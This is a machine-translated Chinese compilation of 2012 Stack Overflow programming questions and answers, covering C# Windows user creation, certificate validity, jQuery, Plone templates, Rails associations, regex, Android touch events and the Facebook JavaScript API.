我想使用 c# 代码创建一个 windows 用户。当登录用户具有管理员权限时，以下方法可以正常工作。它不适用于受限用户。注意我可以通过管理员用户的windows用户名和密码。基本上我想模仿。我试过模仿它没有用。我尝试将用户 namd 和密码传递给 processinfo。我收到错误“存根收到错误数据”。那么任何人都可以帮助我如何通过模拟使用 C# 代码创建 Windows 用户。

```
 public static void CreateUser(string userName, string password, string description, string adminUserName, string adminPassword)
    {
        Process process = new Process();
        ProcessStartInfo processInfo = new ProcessStartInfo();
        processInfo.WorkingDirectory = Environment.SystemDirectory;
        processInfo.FileName = "net.exe";
        processInfo.UseShellExecute = false;
        processInfo.RedirectStandardError = true;
        processInfo.RedirectStandardInput = true;
        processInfo.RedirectStandardOutput = true;
        processInfo.WindowStyle = ProcessWindowStyle.Hidden;

        processInfo.Arguments = @" user " + userName + @" " + password + @" /ADD /ACTIVE:YES " +
          @"/EXPIRES:NEVER /FULLNAME:" + userName + @" /PASSWORDCHG:NO /PASSWORDREQ:YES";

        if (!string.IsNullOrEmpty(adminUserName))
        {
            processInfo.UserName = adminUserName;
            processInfo.Password = WindowsSecurityHelper.GetSecuredString(adminPassword);
        }
        process.StartInfo = processInfo;
        process.Start();
        process.WaitForExit();
        process.Close();

    } 
```

或者

```
 public static void CreateUser(string userName, string password, string description, string userGroup = "Users")
    {
        PrincipalContext pc = new PrincipalContext(ContextType.Machine, null);
        GroupPrincipal gp = GroupPrincipal.FindByIdentity(pc, userGroup);
        if (gp != null)
        {
            UserPrincipal u = new UserPrincipal(pc);
            u.SetPassword(password);
            u.Name = userName;
            u.Description = description;
            u.UserCannotChangePassword = true;
            u.PasswordNeverExpires = true;
            u.Save();

            gp.Members.Add(u);
            gp.Save();
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:16:40.033

您可以使用`Process`具有不同凭据的类 - 而不是直接设置它，使用[`ProcessStartInfo`](http://msdn.microsoft.com/en-us/library/system.diagnostics.processstartinfo).

您可以在您希望执行的用户的类上设置a`UserName`和(顺便说一下 ) - 将其传递给构造函数，您就可以开始了。`Password``ProcessStartInfo``Password`[`SecureString`](http://msdn.microsoft.com/en-us/library/system.security.securestring)`Process`

```
ProcessStartInfo startInfo = new ProcessStartInfo("net.exe");
startInfo.UserName = Administrator;
startInfo.Password = ...;

...

Process.Start(startInfo); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T17:43:15.813

我有同样的错误，发现我需要在 ProcessStartInfo 中指定 Domain 参数。

# certificate - 检查特定时间的证书有效性

> ID：12215132
> 
> 赞同：4
> 
> 时间：2012-08-31T12:11:52.407
> 
> 标签：certificate, ocsp

我目前正在使用具有 PDF 签名选项的系统。

现在，在创建一个互补的 Android 应用程序时，我遇到了一个难题：**如何检查证书的有效性？**

问题是，我对证书在签名时是否有效感兴趣。现在我知道，Adobe 有这种能力，但我想知道如何自己实现这样的东西。

我已经成功地对照 OCSP 检查了证书的状态，但它唯一给我的证书状态是它是否已被撤销/暂停以及日期（这是不正确的，仍然让我感到困惑）。我还查看了 CRL，但似乎每个证书只有一个记录，这意味着它无法告诉我证书在特定时间点是否有效。

例子：

```
Certificate 01 4D 44 5B - issued on 20.08.2012 - suspended on 21.08.2012 - reactivated on 22.08.2012

PDF document1 - signed on 20.08.2012

PDF document2 - signed on 21.08.2012 
```

现在，如果我们在 Adob​​e Reader 中检查文档的有效性，**PDF1 将显示 valid 而 PDF2 将显示为 invalid**。

**Adobe 是如何知道的，我如何找到相同的信息**？也许有一些操作系统程序，我可以看看谁的来源，找出这个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T12:09:43.050

这通常通过在数字签名中嵌入时间戳来完成，通常它本身由不同但受信任的 CA 签名，就像[Microsoft authenticationcode](http://blogs.msdn.com/b/ieinternals/archive/2011/03/22/authenticode-code-signing-for-developers-for-file-downloads-building-smartscreen-application-reputation.aspx)中使用的那样。将此时间戳与证书的有效期进行比较，以确定证书在签名时是否有效。

另请参阅[代码签名中的会签如何工作？](https://stackoverflow.com/questions/9128133/how-does-countersign-in-code-signing-work)或[signtool.exe /t 选项](http://msdn.microsoft.com/en-us/library/8s9b9yaz%28v=vs.80%29.aspx)进行更多讨论。

# c# - 如何在asp.net中使用jquery检查gridview中文本框中的值？

> ID：12215138
> 
> 赞同：-1
> 
> 时间：2012-08-31T12:12:08.757
> 
> 标签：c#, jquery

我使用 gridview 来显示一些产品，并使用 gridview 内的文本框来输入数量。如果文本框为空，我编写了一个 jquery 来显示一个警告框。但是在显示警告框时，页面会重新加载。但我想在不重新加载的情况下显示警报框。由于它在母版页中，我不知道该怎么做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:17:05.980

可能这会帮助您
在这样的警报语法之后使用 return false

```
alert('Please provide value');
return false; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:21:26.207

弹出消息框以通知用户某些字段没有（正确的）值通常会被以前的用户认为是烦人的，因为它完全阻止了浏览器并迫使用户先单击“确定”，然后她才能执行任何其他操作。

[除了这个](http://uxdesign.smashingmagazine.com/2011/11/08/extensive-guide-web-form-usability/)来支持我的大胆声明之外，我没有找到一个好的可靠来源：

> **错误消息**这会通知用户发生了错误，并且通常会阻止他们在表单中继续进行。通过颜色（通常是红色）、熟悉的图标（例如警告标志）、突出度（通常在表单顶部或发生错误的位置旁边）、大字体或这些的组合来强调错误消息。
> 
> **成功消息**使用此消息通知用户他们已达到表单中有意义的里程碑。如果表单很长，成功消息会鼓励用户继续填写。像错误消息一样，成功消息应该很突出。**但它们不应妨碍用户继续。**

更好的方法可能是使用非阻塞消息并停止提交。[jQuery Validation](http://docs.jquery.com/Plugins/Validation)是一个优秀的框架来验证你的用户输入。

# java - 试图从中心画两个数字和相等的距离

> ID：12215143
> 
> 赞同：1
> 
> 时间：2012-08-31T12:12:27.497
> 
> 标签：java, java-2d, drawing2d

我希望它看起来对称，但我不知道为什么这不起作用。

```
Font scoreFont = new Font("Impact", Font.PLAIN, 72);
    g.setFont(scoreFont);
    FontMetrics scoreFontMetrics = g.getFontMetrics();
    g.drawString("" + playerOneScore, SCREEN_WIDTH / 2
            - 30 - scoreFontMetrics.charWidth(playerOneScore),
            SCREEN_HEIGHT / 2);
    g.drawString("" + playerTwoScore,
            SCREEN_WIDTH / 2 + 30,
            SCREEN_HEIGHT / 2);

} 
```

## 提前致谢。

我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:20:42.963

`charWidth`in`FontMetrics`获取 a作为`char`参数。If `playerOneScore`is an `int`than 它实际上转换为它的`char`值，然后将其应用于方法。你会更好地使用`stringWidth(playerOneScore + "");`

# objective-c - NSMutableArray 多维，获取一列

> ID：12215148
> 
> 赞同：0
> 
> 时间：2012-08-31T12:12:36.890
> 
> 标签：objective-c, nsarray

我有一个用字典创建的 NSArray：

```
aMapData = [[NSMutableArray alloc] initWithCapacity:sizeof(jsonResponse)];

for (NSMutableDictionary *dict in jsonResponse) {  

    NSDictionary *row = [NSDictionary dictionaryWithObjectsAndKeys:[dict objectForKey:@"pID"], @"pID", [dict objectForKey:@"Address"], @"Address",  nil];
    [aMapData addObject:row];

  } 
```

它有大约 100 行。

我想获得 pID 列，是迭代的唯一选择，并且：

```
 [aMapData objectAtIndex:0] 
```

?

先感谢您！

我发现它，不需要数组：

```
NSArray *idPath = [aMapData valueForKey:@"pID"]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:06:18.890

是的。否则，您必须将每一列存储在一个单独的数组中。

```
pID = [[NSMutableArray alloc] init];
address = [[NSMutableArray alloc] init];

for (NSMutableDictionary *dict in jsonResponse) {  
    [pID addObject:[dict objectForKey:@"pID"]];
    [address addObject:[dict objectForKey:@"address"]];
} 
```

# python - 如何在plone main_template中为TAL自定义body标签相当于“ondragstart =“false”？

> ID：12215151
> 
> 赞同：0
> 
> 时间：2012-08-31T12:12:59.737
> 
> 标签：python, plone, template-tal, zpt, template-metal

我希望自定义 plone 4.1 的 main_template 以防止鼠标选择和拖动。不知道具体在哪里以及如何在 body 标签中进行操作。还需要一个简单快速的参考来学习 TAL、TALES、METAL。适合初学者的东西。请指导。我希望防止从浏览器复制/粘贴。我已经为文件预览定制了它，但无法对 main_template 做同样的事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-01T11:12:36.047

自定义 body 标签的最简单方法是安装[plone.app.theming](http://pypi.python.org/pypi/plone.app.theming)。它更容易理解，可以通过网络完成，并且更有可能通过升级保持兼容。它与 Plone 4.1 兼容并包含在 4.3 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:23:31.503

如果您要添加一个简单的`ondragstart="false"`属性，则不需要任何 TAL、TALES 或 METAL 知识。

TAL 是一种支持 XML 的模板语言，它使用名称空间和 XML 属性来“融入”到模板结构中。因此，您可以将额外的属性添加到 TAL 特定属性之外的标签。

只需自定义`main_template`文件并将属性添加到 body 标记：

```
<body ondragstart="false" class="" tal:attributes="..." /> 
```

如果您仍想阅读 TAL、TALES 和 METAL，您可以阅读 Zope 2 书，[第 10 章：使用 Zope 页面模板](http://docs.zope.org/zope2/zope2book/ZPT.html)，[第 13 章：高级页面模板](http://docs.zope.org/zope2/zope2book/AdvZPT.html)和[附录 C：Zope 页面模板参考](http://docs.zope.org/zope2/zope2book/AppendixC.html)。

# ruby-on-rails-3 - 从给定对象的活动记录 has_and_belongs_to_many 关联中查找行

> ID：12215154
> 
> 赞同：0
> 
> 时间：2012-08-31T12:13:13.683
> 
> 标签：ruby-on-rails-3, activerecord

我有两个模型

```
 class User < ActiveRecord::Base
  has_and_belongs_to_many :shops
 end

 class Shop < ActiveRecord::Base
  has_and_belongs_to_many :users
 end 
```

我必须从与用户对象关联的连接表 users_shops 中找到行

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:18:08.817

为`UserShop`

```
class UserShop < ActiveRecord::Base
  belongs_to :user
  belongs_to :shop
end 
```

然后对于一些`user`你可以做

```
user_shops = UserShop.where(:user_id => user.id) 
```

您也可以直接将关系添加到`UserShop`from`User`

```
class User < ActiveRecord::Base
  has_and_belongs_to_many :shops
  has_many :user_shops
end 
```

给定一些`user`，你可以做

```
user_shops = user.user_shops 
```

# windows - 什么是“从 VC 7.1 升级”属性表？

> ID：12215155
> 
> 赞同：0
> 
> 时间：2012-08-31T12:13:20.207
> 
> 标签：windows, visual-studio-2010, visual-studio

我正在将一个项目从 MSVS2005 移植到 MSVS2010。我刚刚在 MSVS2010 中加载了解决方案并让向导转换项目。

我遇到了物业经理，发现了这些物业表（从上到下）：

*   从 VC 7.1 升级
*   Microsoft.Cpp.x64（或 Win32）.user
*   多字节字符支持（不可编辑）
*   到 MFC 的动态链接（不可编辑）

我了解最后三个，但我不知道**Upgrade from VC 7.1**的目的是什么。有人可以给我一点解释吗？

* * *

PS 我在属性页“从 VC 7.1 升级”中找到 C/C++, Preprocessor, Preprocessor Definitions = **_VC80_UPGRADE=0x0710;%(PreprocessorDefinitions)**但在项目属性中我看到**NDEBUG;WIN32;_LIB;%(PreprocessorDefinitions)**。这是什么意思呢？**_VC80_UPGRADE=0x0710**宏是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T13:13:41.090

项目属性表只是为项目预先设置设置。除非项目覆盖设置。您的项目所做的，它会覆盖“预处理器定义”设置。额外的“%(PreprocessorDefinitions)”宏确保属性表中的定义被*附加*并且不会丢失。

所以编译器看到的定义是`NDEBUG;WIN32;_LIB;_VC80_UPGRADE=0x0710`

_VC80_UPGRADE 宏可帮助您的旧项目在 Visual Studio 2005 或更高版本上正确编译和运行。一方面，在 vc/atlmfc/include/afxres.h 中使用它来确保清单资源具有正确的 ID。

您正在跳过许多 VS 和 Windows 版本，所以这并不完全意味着您完全没有问题。特别是 UAC 会让你头疼。

# xcode - 是否可以在 Mac App 资源文件夹中对文件进行分组

> ID：12215156
> 
> 赞同：2
> 
> 时间：2012-08-31T12:13:23.590
> 
> 标签：xcode, macos

我正在使用 Xcode 和 Objective C 开发 Mac 应用程序，我还计划在应用程序中使用 C++ 可执行文件。

我想要 MyApp.app/Contents/MacOS 文件夹中的 C++ 二进制文件，并且想要对我的 C++ exe 所需的 conf 进行分组，例如

MyApp.app/Contents/Resources/conf/MyApp.conf

MyApp.app/Contents/Resources/conf/MyAppVer.conf

MyApp.app/Contents/Resources/db/populate.sql

还有我用于应用程序的图像，如 logo.icns(App ICON)、png's 等，我希望它们分组在 Resources 文件夹下

MyApp.app/Contents/Resources/images

是否可以像这样对资源进行分组并在我的应用程序中访问它们..？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-02T19:18:33.070

是的，您的资源文件夹中可以有文件夹。在 Finder 中创建您的文件夹（images、conf、db 等）并将您的文件放置在适当的文件夹中。将文件夹添加到您的项目中。当您将文件添加到项目中时，“打开”面板底部将有两个“文件夹”单选按钮。选择为任何添加的文件夹创建文件夹引用单选按钮。

![在此处输入图像描述](../Images/77900c846173b4d0038d35476d15e51e.png)

# javascript - JetBrains WebStorm 智能感知

> ID：12215159
> 
> 赞同：0
> 
> 时间：2012-08-31T12:13:38.397
> 
> 标签：javascript, intellisense, webstorm, ecmascript-5

当我在 WebStorm 中看到智能感知菜单时，它会显示带有字母的小圆形图标（即“v”、“m”、“f”、“p”）。

有谁知道所有图标的含义，或者知道在哪里可以参考理解 WebStorm 的智能感知？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T13:29:13.187

您可以在 WebStorm 帮助中找到[图标参考。](http://www.jetbrains.com/webstorm/webhelp/symbols.html)

*   `v`- 多变的
*   `m`- 方法
*   `f`- 场地
*   `p`- 范围

# jpa - 数据核在 HBase 上合并不工作（序列化（分离）对象）

> ID：12215160
> 
> 赞同：0
> 
> 时间：2012-08-31T12:13:39.410
> 
> 标签：jpa, hbase, datanucleus

尝试合并其 Id 与 HBase 中已存在的相应数据存储实体匹配的实体时出现异常：

```
javax.persistence.PersistenceException: Object "ai.ilikeplaces.entities.Wall@4aaf0d" being inserted has id "12653" yet an object with this id already exists in the datastore!
        at org.datanucleus.api.jpa.NucleusJPAHelper.getJPAExceptionForNucleusException(NucleusJPAHelper.java:30
2)
        at org.datanucleus.api.jpa.JPAEntityManager.merge(JPAEntityManager.java:568)
        at ai.ilikeplaces.util.cache.AbstractHCMapStore.store(AbstractHCMapStore.java:39)
        at ai.ilikeplaces.logic.crud.hazelcast.HazelcastWallMapStore.store(HazelcastWallMapStore.java:20)
        at com.hazelcast.impl.concurrentmap.MapStoreWrapper.store(MapStoreWrapper.java:110)
        at com.hazelcast.impl.CMap$1.run(CMap.java:994)
        at com.hazelcast.impl.executor.ParallelExecutorService$ParallelExecutorImpl$ExecutionSegment.run(ParallelExecutorService.java:212)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:679)
Caused by: org.datanucleus.exceptions.NucleusUserException: Object "ai.ilikeplaces.entities.Wall@4aaf0d" being inserted has id "12653" yet an object with this id already exists in the datastore!
        at org.datanucleus.store.hbase.HBasePersistenceHandler.insertObject(HBasePersistenceHandler.java:129)
        at org.datanucleus.state.JDOStateManager.internalMakePersistent(JDOStateManager.java:2371)
        at org.datanucleus.state.JDOStateManager.makePersistent(JDOStateManager.java:2347)
        at org.datanucleus.ObjectManagerImpl.persistObjectInternal(ObjectManagerImpl.java:1798)
        at org.datanucleus.ObjectManagerImpl.persistObjectWork(ObjectManagerImpl.java:1647)
        at org.datanucleus.ObjectManagerImpl.persistObject(ObjectManagerImpl.java:1504)
        at org.datanucleus.api.jpa.JPAEntityManager.merge(JPAEntityManager.java:564)
        ... 8 more 
```

尝试合并实体时。

与此异常相关的代码是：

```
 System.out.println("Attempting to store data:" + value);
        EntityManagerFactory emf = Persistence.createEntityManagerFactory("adimpression_ilikeplaces_war_1.6-SNAPSHOTPU_DN");
        System.out.println("Obtained EntityManagerFactory.");

        EntityManager em = emf.createEntityManager();
        System.out.println("Obtained EntityManager.");

        em.getTransaction().begin();
        System.out.println("Began Transaction.");

        em.merge(value);

        System.out.println("Persisted data.");

        em.getTransaction().commit();
        System.out.println("Committed Transaction"); 
```

在哪里

```
em.merge(value); 
```

是第 39 行。即 AbstractHCMapStore.java:39 。

我要合并的实体是一个新实体，即使用 java new 关键字创建的，以前没有从数据库中获取。

任何帮助将不胜感激。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T06:05:35.207

如果您尝试合并**序列化**对象，请在**persistence.xml**中设置**datanucleus.allowAttachOfTransient=true**

# c# - 在 C# 中查找以 / 或 \ 开头并以 .js 扩展名结尾的单词的正则表达式是什么

> ID：12215162
> 
> 赞同：0
> 
> 时间：2012-08-31T12:13:50.853
> 
> 标签：c#

`/`C#中查找以or开头并以or`\`结尾的单词的正则表达式是什么`.js`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:17:29.680

您的模式可能如下所示：

```
string pattern = @"^((\\|/).*?\.js)$";
Regex re = new Regex(pattern);
string file ="/whatever.js";
if (re.IsMatch(file)) 
{
   //Match
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:18:33.963

不完全是 C#：

```
^[\\\/].*\.js$ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:19:01.177

你可以试试

```
"^((\\|/).*\.js)$"; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:20:26.550

这将匹配以 \ 或 / 开头并以 .js 结尾的字母数字字符串

```
[\\/]\w+\.js 
```

如果需要，您可以使用锚点（以前的断言）来指定它必须位于单词边界或字符串的开头/结尾 - [http://msdn.microsoft.com/en-us/library/h5181w5w(v=vs. 110).aspx](http://msdn.microsoft.com/en-us/library/h5181w5w(v=vs.110).aspx)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T12:30:17.153

未经测试，但您可以尝试将`/`or`\`放在字符类中，例如：

*   `'[\]'`或者`"[/]"`
*   `'[\]'`或者`"[/]"`

# visual-c++ - 使用 Visual C ， typeid 抛出异常但仅在调试模式下

> ID：12215163
> 
> 赞同：2
> 
> 时间：2012-08-31T12:13:59.440
> 
> 标签：visual-c++, cmake, windows-7-x64, debug-symbols, typeid

以下代码来自对问题 398069 的回答。它在 Linux 和 Windows 的优化模式下都非常适合我。不幸的是，我的应用程序在 Windows 下崩溃了，我必须调试它......

```
template <class T>
T *set_the_global(T *candidate)
{
std::map<std::string,void*>::iterator r = MainFactoriesMap::mainFactoriesMap().find(std::string(typeid(*candidate).name()));
...
} 
```

在调试模式下（Windows，使用 qtcreator、cmake 2.8.2、Visual C++ 10、Qt 和 boost 可作为调试而不是调试），在进入 main 之前发生的对 typeid 的调用崩溃，似乎抛出异常。我强制使用 /GR 选项。没什么区别...

我将在调试和输出模式下对编译器和链接器的调用放在下面。请注意，我尝试在 Visual Studio 下编译所有内容，但失败了（但这将是另一个问题）。

Optim 构建：它有效

```
c:\PROGRA~2\MICROS~2.0\VC\bin\amd64\cl.exe    /Zc:wchar_t- /EHsc /GR /MD /O2 /Ob2 /D NDEBUG -IE:\Projets\Amose\Sources\lima_common\src -IC:\Qt\v4.8.2\include -IC:\Qt\v4.8.2\include\QtXml -IC:\Qt\v4.8.2\include\QtCore -IC:\PROGRA~1\boost\BOOST_~1\include -Ic:\amose\include    -D DEBUG_CD -D WIN32 -D QT_NO_KEYWORDS -Dlima_common_factory_EXPORTS -DQT_DLL -DQT_XML_LIB -DQT_CORE_LIB -DBOOST_ALL_DYN_LINK -DLIMA_FACTORY_EXPORTING -DQT_NO_DEBUG /TP /FoCMakeFiles\lima-common-factory.dir\AmosePluginsManager.cpp.obj /FdC:\amose-vcbuild\lima-common\src\common\AbstractFactoryPattern\lima-common-factory.pdb -c E:\Projets\Amose\Sources\lima_common\src\common\AbstractFactoryPattern\AmosePluginsManager.cpp 
```

...
"C:\Program Files (x86)\CMake 2.8\bin\cmake.exe" -E vs_link_dll c:\PROGRA~2\MICROS~2.0\VC\bin\amd64\link.exe @CMakeFiles\lima- common-factory.dir\objects1.rsp /out:lima-common-factory.dll /implib:lima-common-factory.lib /pdb:C:\amose-vcbuild\lima-common\src\common\AbstractFactoryPattern\lima -common-factory.pdb /dll /version:0.0 /STACK:10000000 /machine:x64 /INCREMENTAL:NO -LIBPATH:C:\PROGRA~1\boost\BOOST_~1\lib -LIBPATH:c:\amose\lib ..\QsLog\lima-common-qslog.lib ..\misc\lima-common-misc.lib ..\Data\lima-common-data.lib ..\QsLog\lima-common-qslog.lib C: \Qt\v4.8.2\lib\QtXml4.lib C:\Qt\v4.8.2\lib\QtCore4.lib kernel32.lib user32.lib gdi32.lib winspool.lib shell32.lib ole32.lib oleaut32.lib uuid.lib comdlg32.lib advapi32.lib

调试构建：失败

```
c:\PROGRA~2\MICROS~2.0\VC\bin\amd64\cl.exe    /Zc:wchar_t- /EHsc /GR /D_DEBUG /MDd /Zi /Ob0 /Od /RTC1 -IE:\Projets\Amose\Sources\lima_common\src -IC:\Qt\v4.8.2\include -IC:\Qt\v4.8.2\include\QtXml -IC:\Qt\v4.8.2\include\QtCore -IC:\PROGRA~1\boost\BOOST_~1\include -Ic:\amose-debug\include    -D DEBUG_CD -D WIN32 -D QT_NO_KEYWORDS -Dlima_common_factory_EXPORTS -DQT_DLL -DQT_XML_LIB -DQT_CORE_LIB -DBOOST_ALL_DYN_LINK -DLIMA_FACTORY_EXPORTING -DQT_DEBUG /TP /FoCMakeFiles\lima-common-factory.dir\AmosePluginsManager.cpp.obj /FdC:\amose-vcbuild\lima-common-debug\src\common\AbstractFactoryPattern\lima-common-factoryd.pdb -c E:\Projets\Amose\Sources\lima_common\src\common\AbstractFactoryPattern\AmosePluginsManager.cpp 
```

...
"C:\Program Files (x86)\CMake 2.8\bin\cmake.exe" -E vs_link_dll c:\PROGRA~2\MICROS~2.0\VC\bin\amd64\link.exe @CMakeFiles\lima- common-factory.dir\objects1.rsp /out:lima-common-factoryd.dll /implib:lima-common-factoryd.lib /pdb:C:\amose-vcbuild\lima-common-debug\src\common\AbstractFactoryPattern \lima-common-factoryd.pdb /dll /version:0.0 /STACK:10000000 /machine:x64 /debug /INCREMENTAL -LIBPATH:C:\PROGRA~1\boost\BOOST_~1\lib -LIBPATH:c:\amose -debug\lib ..\QsLog\lima-common-qslogd.lib ..\misc\lima-common-miscd.lib ..\Data\lima-common-datad.lib ..\QsLog\lima-common-qslogd .lib C:\Qt\v4.8.2\lib\QtXmld4.lib C:\Qt\v4.8.2\lib\QtCored4.lib kernel32.lib user32.lib gdi32.lib winspool.lib shell32.lib ole32.lib oleaut32。 lib uuid.lib comdlg32.lib advapi32.lib

使用 qtcreator 显示调试会话：

![](../Images/4862f7c73aeddf7e6f79f8cabc524f05.png)

# javascript - 在拖放时获取 jQuery UI Sortable 中的 ul 和 li 值

> ID：12215167
> 
> 赞同：1
> 
> 时间：2012-08-31T12:14:22.937
> 
> 标签：javascript, jquery-ui, html-lists

我有这个代码：

```
<ul id="sortable1" class="connectedSortable">
<li class="ui-state-default">Song Description 1</li>
<li class="ui-state-default">Song Description 2</li>
</ul>

<ul id="sortable2" class="connectedSortable">
<li class="ui-state-default">Song Description 3</li>
<li class="ui-state-default">Song Description 4</li>
</ul> 
```

我需要做的是当我拖放时（例如，歌曲描述 1 从`#sortable1`到某个位置`#sortable2`）给我一个警报（例如，歌曲 1 从`#sortable1`被放入`#sortable2`）

那可能吗？我应该在“li”中添加 ID 吗？

非常感谢帮助。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T12:42:50.853

无需添加`id`到可排序的项目中，jQueryUI 提供了回调函数（参见[http://jqueryui.com/demos/sortable/](http://jqueryui.com/demos/sortable/)上的*事件*），您可以在某些事件发生时挂钩。在下面的示例中，我使用了*接收*回调，它传递了*事件*和*ui*对象参数，其中包含构造消息所需的一切。

 ***### JavaScript

```
​$('#sortable1, #sortable2').sortable({
    connectWith: '.connectedSortable',
    receive: function(event, ui) {
        console.log(ui.item.html() + ' from #' + ui.sender.context.id + ' was dropped in #' + this.id);
    }
});​ 
```

[**还在jsFiddle上**](http://jsfiddle.net/U67cY/)做了一个demo[](http://jsfiddle.net/U67cY/)***

# android - Android onTouch 事件在 Galaxy S3 中不起作用

> ID：12215168
> 
> 赞同：2
> 
> 时间：2012-08-31T12:14:30.930
> 
> 标签：android

我正在开发一个 android 应用程序，在该应用程序中我覆盖了活动的 onTouchEvent 并在按下屏幕时打开了一个新活动。它在 Google Nexus S（升级到 Android 4.0.4）和三星 Galaxy S2（2.3.4）上运行良好。但是当我在三星 Galaxy S3 上运行该应用程序时，触摸屏幕时无法进入下一步。S3的触摸事件处理有什么不同吗？

```
public boolean onTouchEvent(MotionEvent event) { 
    switch (event.getAction()) { 
    case MotionEvent.ACTION_DOWN: 
        break; 
    case MotionEvent.ACTION_MOVE: 
        break; 
    case MotionEvent.ACTION_UP: 
        Intent mIntent = new Intent(getApplicationContext(), screen3.class);
        startActivity(mIntent);
        break; 
    } 
    return true; 
} 
```

# javascript - 节点的 ownerDocument 属性为空

> ID：12215170
> 
> 赞同：3
> 
> 时间：2012-08-31T12:14:36.937
> 
> 标签：javascript, dom, firefox-addon

我正在开发一个 Firefox 扩展，我试图在其中查找给定节点是否与网页中的选择范围相交。为此，我使用以下代码：

```
var rangeIntersectsNode = function(range, node) {
        var nodeRange = node.ownerDocument.createRange();
        try {
            nodeRange.selectNode(node);
        }
        catch(e) {
            nodeRange.selectNodeContents(node);
        }

        return range.compareBoundaryPoints(content.Range.END_TO_START, nodeRange) == -1 &&
        range.compareBoundaryPoints(content.Range.START_TO_END, nodeRange) == 1;
    } 
```

当我在 Firefox 9 或更低版本中使用此代码时，我在控制台中收到错误消息`ownerDocument is null`

谁能告诉我这里出了什么问题以及如何正确设置？旧版本的浏览器是否有等效的 api？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:19:30.970

[如果在本身是文档的节点上使用此属性，则结果为空。](https://developer.mozilla.org/en-US/docs/DOM/Node.ownerDocument)

另请参阅： [Dom 2 规范](http://www.w3.org/TR/2000/REC-DOM-Level-2-Core-20001113/core.html#node-ownerDoc)

# python - 使用 scikits.cuda.cula 感到困惑

> ID：12215172
> 
> 赞同：0
> 
> 时间：2012-08-31T12:14:44.107
> 
> 标签：python, cuda, scikits

我想使用一些 cula 功能，如 LU 分解或矩阵逆，但我对指针输入有一些问题。例如，使用 scikits.cuda.cula.culaDeviceSgetrf(m, n, a, lda, ipiv) 进行 LU 分解，需要使用指针 f "a" 参数，但 python 中没有明确的指针（我知道所有变量python 是由 ref) 。那么在这种情况下我应该怎么做呢？我应该使用 ctype 库来创建 python 吗？

这就是我想要做的：

```
 import numpy as np

   import scikits.cuda.cula as cula
   import pycuda.gpuarray as gpuarray

   cula.culaInitialize()

   //I create a square matrix for simplicity 
   a=np.array([[1,2,3,4],[6,7,8,9],[7,2,3,5],[2,4,5,6]])

   n=b.shape[0]
   ida=ipv=m

   scikits.cuda.cula.culaDeviceSgetrf(m,n,a,n,n) 
```

> status = _libcula.culaDeviceSgetrf(m, n, int(a), lda, int(ipiv)) TypeError: only length-1 arrays can be convert to Python scalars

当我尝试

```
a_gpu = gpuarray.to_gpu(a)
scikits.cuda.cula.culaDeviceSgetrf(m,n,a_gpu,n,n) : 
```

> 回溯（最后一次调用）：文件“”，第 1 行，在文件“/usr/local/lib/python2.7/dist-packages/scikits.cuda-0.042-py2.7.egg/scikits/cuda/cula .py"，第 329 行，在 culaDeviceSgetrf status = _libcula.culaDeviceSgetrf(m, n, int(a), lda, int(ipiv)) TypeError: int() argument must be a string or a number, not 'GPUArray'

任何解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-02T07:38:23.157

错误消息非常不言自明。您不能将 a`gpuarray`直接传递给这些例程，数组参数应该是一个设备指针，它在内部转换为 Python`ctypes.c_void_p`以传递给 CULA 库。PyCUDA`gpuarray`包含一个成员`ptr`，它将返回指向 GPU 内存的底层指针。

如果您执行以下操作：

```
a_gpu = gpuarray.to_gpu(a)
scikits.cuda.cula.culaDeviceSgetrf(m,n,a_gpu.ptr,n,n) 
```

它应该可以正常工作[免责声明：从未编译或测试，使用风险自负]。

# javascript - 使用 FB.api 在 Facebook 中发布消息

> ID：12215175
> 
> 赞同：0
> 
> 时间：2012-08-31T12:14:55.890
> 
> 标签：javascript, facebook, facebook-javascript-sdk

我尝试使用 FB.api 在我的墙上发布消息。但我没有得到任何回应。请你帮助我好吗。请检查我的代码一次。

```
function shareWithFacebook(content) {
    FB.api('/me/feed', 'post', {
        message: content
    }, function (response) {        
        if (!response || response.error) {            
            alert('Error : ' + response.error);
        } else {
            alert('Post ID: ' + response.id);            
        }
    });
    return false;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:07:10.787

试试这个例子

```
<script>
var publish = {
  method: 'feed',
  message: 'getting educated about Facebook Connect',
  name: 'Connect',
  caption: 'The Facebook Connect JavaScript SDK',
  description: (
      'A small JavaScript library that allows you to harness ' +
      'the power of Facebook, bringing the user\'s identity, ' +
      'social graph and distribution power to your site.'
  ),
  link: 'http://www.fbrell.com/',
  picture: 'http://www.fbrell.com/public/f8.jpg',
  actions: [
    { name: 'fbrell', link: 'http://www.fbrell.com/' }
  ],
  user_message_prompt: 'Share your thoughts about RELL'
};

FB.ui(publish, Log.info.bind('feed callback'));
</script> 
```

* * *

## 回答 #2

